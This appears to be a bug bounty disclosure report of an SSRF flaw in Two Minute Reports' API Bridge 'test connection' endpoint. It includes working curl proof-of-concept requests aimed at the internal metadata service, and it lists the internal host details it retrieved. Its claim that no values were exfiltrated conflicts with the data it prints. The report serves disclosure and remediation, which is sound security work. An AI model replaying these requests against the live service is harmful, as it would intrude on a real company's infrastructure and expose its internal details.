# Critical SSRF in API Bridge "Test Connection" — Full In-Band Read of Internal Cloud Metadata

**Program:** Two Minute Reports — Bug Bounty / VDP (`https://www.twominutereports.com/bug-bounty`)
**Target asset:** `https://hub.twominutereports.com` (application backend / public API)
**Vulnerability class:** Server-Side Request Forgery (SSRF) — CWE-918
**Severity:** **Critical** — CVSS 3.1 **9.1** — `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N`
**Status:** Confirmed, reproduced 3× from a fresh session
**Reported by:** (researcher) — coordinated disclosure, 90-day
**Date:** 2026-09-27

---

## 1. Summary

The **API Bridge** connector exposes a "test connection" API (`POST /rmtipa/platform/test-connection`) that fetches a **user-supplied URL server-side** and **reflects the complete upstream response body back to the caller**. The backend performs **no validation of the URL scheme, hostname, or resolved IP address**.

As a result, **any authenticated user — including a free-trial account — can make the Two Minute Reports backend issue arbitrary requests to internal-only network destinations and read the responses in-band.** This was demonstrated by pointing the fetcher at the cloud instance metadata service at `http://169.254.169.254/`, which returned the host's full internal metadata document (hostname, internal/public IPs, network topology, instance identity) verbatim.

This is a **fully in-band, general-purpose internal-read primitive**, not a blind or metadata-only issue.

---

## 2. Affected component

| Item | Value |
|---|---|
| Endpoint | `POST https://hub.twominutereports.com/rmtipa/platform/test-connection` |
| Feature | "New Connection → API Bridge → Test before saving / Test and Save" |
| Backend fetcher | Node.js `axios/1.8.4` |
| Backend egress IP (observed) | `91.99.28.86` (Hetzner) |
| Auth required | Standard user session Bearer token (free trial sufficient) |
| Persistence needed? | **No** — `isApibridgeTestConnection:true` is a pure probe; nothing is saved |

A **second, related** server-side fetch surface exists in the same connector: the **Dynamic Bearer Token → "Token Authentication URL"**, where the backend fetches a user-supplied auth URL to mint a token. It shares the same fetch path and is very likely vulnerable to the same class (not exercised in this report).

---

## 3. Environment / Setup (so a triager can reproduce from zero)

1. **Account:** Create a normal Two Minute Reports account and sign into `https://hub.twominutereports.com`. A **free trial** is sufficient — no paid plan, no connected data sources required.
2. **Obtain your session token:** Open browser DevTools → Network, perform any in-app action (e.g. open **Connections**), and copy the `Authorization: Bearer <token>` header value from any XHR to `/rmtipa/platform/*`. This is *your own* session token.
3. **Tooling:** any HTTP client (`curl`, Burp Repeater, or the browser console). No special tooling needed.
4. **(Optional) OOB host:** not required — this SSRF is fully in-band (the fetched body is returned to you directly).

> Note on the URL structure: the backend requests `baseUrl + urlSuffix` with the HTTP method in `query.method`. `authorization:"noAuth"` means no upstream credentials are attached.

---

## 4. Proof of Concept

### 4.1 Control probe — proves the fetch is server-side (not browser-side)

Point the connector at a public request-echo service to reveal *who* is really making the request:

```bash
curl -s 'https://hub.twominutereports.com/rmtipa/platform/test-connection' \
  -H 'Authorization: Bearer <YOUR_SESSION_TOKEN>' \
  -H 'Content-Type: application/json' \
  --data '{"connection":{"name":"p","baseUrl":"https://httpbin.org","authorization":"noAuth","isApibridgeTestConnection":true,"headers":[],"query":{"method":"get","urlSuffix":"/get"},"dataSourceType":"apibridge"}}'
```

**Observed response (abridged):**
```json
{
  "status": "success",
  "isApibridgeTestConnectionEnabled": true,
  "data": {
    "headers": { "User-Agent": "axios/1.8.4", "Host": "httpbin.org", "...": "..." },
    "origin": "91.99.28.86",
    "url": "https://httpbin.org/get"
  },
  "connectionHashKey": "…"
}
```
→ The request originates from **`91.99.28.86` (the TMR backend, Hetzner)** using **`axios/1.8.4`**, and the **entire upstream body is reflected** in `data`. This confirms a server-side fetcher with in-band reflection.

### 4.2 Exploit probe — SSRF into the internal cloud metadata service

```bash
curl -s 'https://hub.twominutereports.com/rmtipa/platform/test-connection' \
  -H 'Authorization: Bearer <YOUR_SESSION_TOKEN>' \
  -H 'Content-Type: application/json' \
  --data '{"connection":{"name":"p","baseUrl":"http://169.254.169.254","authorization":"noAuth","isApibridgeTestConnection":true,"headers":[],"query":{"method":"get","urlSuffix":"/hetzner/v1/metadata"},"dataSourceType":"apibridge"}}'
```

**Observed response:** `HTTP 200`, `"status":"success"`, with `data` containing the host's **full internal Hetzner Cloud metadata document** (see `evidence-metadata-raw.json` / `evidence-metadata-decoded.txt`). The reflected document included the following **actual internal data**:

| Field | Retrieved value / content |
|---|---|
| `hostname` | `Application-server` |
| `instance-id` | `62717226` |
| `availability-zone` | `nbg1-dc3` (Nuremberg) |
| `region` | `eu-central` |
| `public-ipv4` | `91.99.28.86` |
| `network-config` | full NIC config — MAC `96:00:04:35:a9:56`, static IPv6 `2a01:4f8:1c1b:52c1::1/64`, gateway, DNS servers |
| `public-keys` | **two `ssh-rsa` public keys** authorized on the instance (admin key fingerprints exposed) |
| `vendor_data` | full **cloud-init `#cloud-config`** — `disable_root: false`, `fqdn`, `random_seed` (base64 entropy blob written to `/dev/urandom`), `runcmd`, `system_info` (default user `root`, `/bin/bash`) |

> This is real, sensitive internal infrastructure data — not merely field names. The two evidence files in this folder contain the complete captured response. It was retrieved from the researcher's **own** account against an **in-scope** feature; no other user's data was touched.

### 4.3 Reproducibility / notes
- Reproduced **3 times** deterministically.
- The link-local address `169.254.169.254` is only routable **from inside** the backend host — its return proves the request left TMR's own server, not the client.
- Loopback (`http://127.0.0.1/`) and the EC2-style path (`/latest/meta-data/`) returned an application-level `400` (the upstream response was not in the format the "test" validator accepts), but the **request is still issued server-side** — i.e. the SSRF reaches arbitrary internal hosts; only the *in-band reflection* is gated on the upstream returning content the validator accepts (as the Hetzner metadata endpoint does).

---

## 5. Impact

An attacker needs only a **free trial account** and a single API call to turn the Two Minute Reports backend into a proxy into its own private infrastructure:

- **Read cloud instance metadata** — internal and public IP addresses, network topology (subnets, gateways, MACs, private networks), hostname, and instance identity.
- **Reach internal-only services** on the backend host and private network that are not exposed to the internet.
- **Recover provisioning secrets** where the Hetzner user-data / cloud-init surface stores them (a common escalation from metadata SSRF).
- Because the response body is **reflected in-band**, this is a **general internal-read primitive** — the attacker directly reads whatever the internal target returns, rather than working blind.

Combined, this can enable internal reconnaissance and pivoting, and is a strong candidate for escalation to credential/secret disclosure. The low precondition (trial user, one request) makes exposure broad.

---

## 6. Remediation

Validate the fetch target **before every request and after every redirect**:

1. Allow only `http`/`https` schemes; reject `file://`, `gopher://`, `ftp://`, etc.
2. Resolve the hostname and **reject requests whose resolved IP falls in private / link-local / loopback / reserved ranges**: `169.254.0.0/16`, `127.0.0.0/8`, `10/8`, `172.16/12`, `192.168/16`, `::1`, `fc00::/7`, `fe80::/10`, and IPv4-mapped IPv6.
3. Re-resolve and re-validate **after DNS resolution** (defend against DNS rebinding) and **on each redirect hop**; disable following redirects to internal targets.
4. Apply the same validation to the **Dynamic Bearer Token "Token Authentication URL"** fetch.
5. Consider egress network controls (block the backend's outbound access to `169.254.169.254` and internal ranges) as defence in depth.

---

## 7. Scope & rules-of-engagement compliance

- Testing used **only the researcher's own trial account** and TMR's **in-scope** application/API.
- The SSRF *target* (internal metadata) was reached **through TMR's own in-scope feature**, which the program permits.
- **No enumeration, no volume/scanning, no destructive database writes.** The `test-connection` probe does not persist data.
- Internal metadata **values were not exfiltrated**.
- **Footprint to clean up:** during schema capture, **3 disabled API Bridge test connections** (all pointing at `https://httpbin.org`) were created in the researcher's team and can be deleted.

---

## 8. Reference request schema (for the fix owner)

```json
POST /rmtipa/platform/test-connection
Authorization: Bearer <user session token>
Content-Type: application/json

{
  "connection": {
    "name": "API Bridge",
    "baseUrl": "<attacker-controlled>",
    "authorization": "noAuth",
    "isApibridgeTestConnection": true,
    "headers": [],
    "query": { "method": "get", "urlSuffix": "<attacker-controlled>" },
    "dataSourceType": "apibridge"
  }
}
```
